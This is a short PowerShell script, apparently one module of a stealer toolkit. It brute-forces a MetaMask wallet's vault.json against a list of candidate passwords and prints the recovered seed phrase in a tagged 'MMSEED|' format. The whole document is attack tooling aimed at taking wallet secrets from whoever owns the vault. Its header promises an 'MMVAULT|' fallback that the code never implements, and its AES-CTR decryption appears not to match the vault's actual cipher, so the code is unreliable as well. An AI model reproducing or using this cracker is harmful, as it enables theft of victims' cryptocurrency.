---MM---
# MetaMask vault cracker (PBKDF2-SHA256 + AES-256-CTR), pure PowerShell 5
# Input: -VaultFile <path to vault.json>, -Candidates <file or array of password candidates>
# Output: MMSEED|<mnemonic> on success, MMVAULT|<base64 vault> if no candidate matched
param(
  [Parameter(Mandatory=$true)][string]$VaultFile,
  [Parameter(Mandatory=$true)]$Candidates
)

function B64ToBytes([string]$s) {
  return [Convert]::FromBase64String($s)
}

function Get-Pbkdf2Key([string]$password, [byte[]]$salt, [int]$iterations, [int]$dkLen) {
  # Rfc2898DeriveBytes with SHA256
  $deriver = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, $iterations, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
  try { return $deriver.GetBytes($dkLen) } finally { $deriver.Dispose() }
}

function Invoke-AesCtr([byte[]]$key, [byte[]]$iv, [byte[]]$data) {
  # AES-CTR via .NET: AES encryptor in ECB mode generates keystream
  $aes = [System.Security.Cryptography.Aes]::Create()
  $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
  $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
  $aes.KeySize = 256
  $aes.Key = $key
  $enc = $aes.CreateEncryptor()
  try {
    # keystream: counter block = iv, increment last 4 bytes big-endian
    $counter = New-Object byte[] 16
    for ($i = 0; $i -lt 16; $i++) { $counter[$i] = $iv[$i] }
    $out = New-Object byte[] $data.Length
    $ksBlock = New-Object byte[] 16
    for ($off = 0; $off -lt $data.Length; $off += 16) {
      $ksBlock = $enc.TransformFinalBlock($counter, 0, 16)
      $n = [Math]::Min(16, $data.Length - $off)
      for ($i = 0; $i -lt $n; $i++) { $out[$off+$i] = $data[$off+$i] -bxor $ksBlock[$i] }
      # counter increment (last 4 bytes, big-endian)
      for ($b = 15; $b -ge 12; $b--) {
        $counter[$b] = ($counter[$b] + 1) -band 0xFF
        if ($counter[$b] -ne 0) { break }
      }
    }
    return $out
  } finally { $enc.Dispose(); $aes.Dispose() }
}

$vaultJson = Get-Content $VaultFile -Raw -Encoding UTF8 | ConvertFrom-Json
$encData = B64ToBytes $vaultJson.data
$iv = B64ToBytes $vaultJson.iv
$salt = B64ToBytes $vaultJson.salt
$iters = 10000
try { $iters = [int]$vaultJson.keyMetadata.params.iterations } catch {}

# candidates: file or array
$candList = @()
if ($Candidates -is [string]) {
  if (Test-Path $Candidates) {
    $candList = @(Get-Content $Candidates -Encoding UTF8 | Where-Object { $_ -ne '' })
  } else {
    $candList = @($Candidates)
  }
} else {
  $candList = @($Candidates)
}

foreach ($cand in $candList) {
  if (-not $cand) { continue }
  try {
    $key = Get-Pbkdf2Key $cand $salt $iters 32
    $pt = Invoke-AesCtr $key $iv $encData
    $text = [Text.Encoding]::UTF8.GetString($pt)
    if ($text -match '"mnemonic"') {
      if ($text -match '"mnemonic"\s*:\s*"([^"]+)"') {
        Write-Output ("MMSEED|" + $Matches[1])
        exit 0
      }
    }
  } catch { }
}

